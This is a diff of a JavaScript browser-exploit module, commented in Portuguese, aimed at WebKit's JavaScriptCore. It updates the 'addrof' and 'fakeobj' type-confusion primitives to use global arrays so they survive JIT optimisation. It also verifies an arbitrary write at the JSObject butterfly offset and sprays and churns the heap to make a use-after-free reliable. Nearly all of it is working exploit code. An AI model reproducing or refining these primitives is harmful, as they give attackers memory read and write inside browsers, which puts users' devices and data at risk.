@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v08 - addrof Robusto e Heap Churning)
+// js/script3/testArrayBufferVictimCrash.mjs (v09 - Primitivas com Escopo Global)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// 1. A primitiva 'addrof' foi refeita para ser mais robusta contra otimizações do JIT.
-// 2. A FASE 5 agora inclui etapas explícitas para forçar o Garbage Collection
-//    e agitar o heap, aumentando drasticamente a confiabilidade do UAF.
+// 1. As primitivas 'addrof' e 'fakeobj' agora usam arrays em escopo global.
+// 2. Isso visa derrotar otimizações do JIT que estavam causando a leitura de
+//    endereços incorretos, estabilizando a base para o exploit de UAF.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -81,6 +81,10 @@ function getSafeOffset(baseObject, path, defaultValue = 0) { /* ...código da v0
 }
 
 
+// --- CORREÇÃO (v09): Arrays para as primitivas agora são globais ---
+const confused_array = [13.37]; 
+const victim_array = [{}];
+
 // =======================================================================================
 // FUNÇÃO ORQUESTRADORA PRINCIPAL
 // =======================================================================================
@@ -103,23 +107,19 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
         
-        // --- CORREÇÃO (v08): Primitivas robustas que recriam seus próprios arrays. ---
+        // --- CORREÇÃO (v09): Primitivas agora usam os arrays globais ---
         const addrof = (obj) => {
-            let confused_array = [13.37]; 
-            let victim_array = [{}];
             victim_array[0] = obj; 
             return doubleToInt64(confused_array[0]); 
         };
         const fakeobj = (addr) => {
-            let confused_array = [13.37];
-            let victim_array = [{}];
             confused_array[0] = int64ToDouble(addr);
             return victim_array[0];
         };
-        logS3("Primitivas 'addrof' e 'fakeobj' robustas operacionais.", "good");
+        logS3("Primitivas 'addrof' e 'fakeobj' com escopo global operacionais.", "good");
 
         logS3("--- FASE 4: Verificando L/E com Primitivas do Core... ---", "subtest");
-        const test_obj_for_rw_verification = {a:1, b:2}; // Objeto diferente para garantir que addrof não use cache
+        const test_obj_for_rw_verification = {a:1, b:2};
         const test_obj_for_rw_verification_addr = addrof(test_obj_for_rw_verification);
         const prop_addr = test_obj_for_rw_verification_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
         await core_arb_write(prop_addr, NEW_POLLUTION_VALUE, 8);
@@ -156,13 +156,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`Liberando ${NUM_OBJECTS} vítimas...`, "warn");
         victims = [];
 
-        // 3. Forçar Garbage Collection e Agitar o Heap (NOVO)
+        // 3. Forçar Garbage Collection e Agitar o Heap
         logS3("Forçando GC e agitando o heap para aumentar a confiabilidade...", "debug");
         let pressure = [];
-        for (let i = 0; i < 20; i++) { pressure.push(new ArrayBuffer(1024*1024)); } // Pressiona a memória
+        for (let i = 0; i < 20; i++) { pressure.push(new ArrayBuffer(1024*1024)); }
         pressure = null;
         let churn = [];
-        for (let i = 0; i < 1000; i++) { churn.push(new ArrayBuffer(Math.random() * 4096)); } // Agita o heap
+        for (let i = 0; i < 1000; i++) { churn.push(new ArrayBuffer(Math.random() * 4096)); }
         churn = null;
         await PAUSE_S3(200);
 
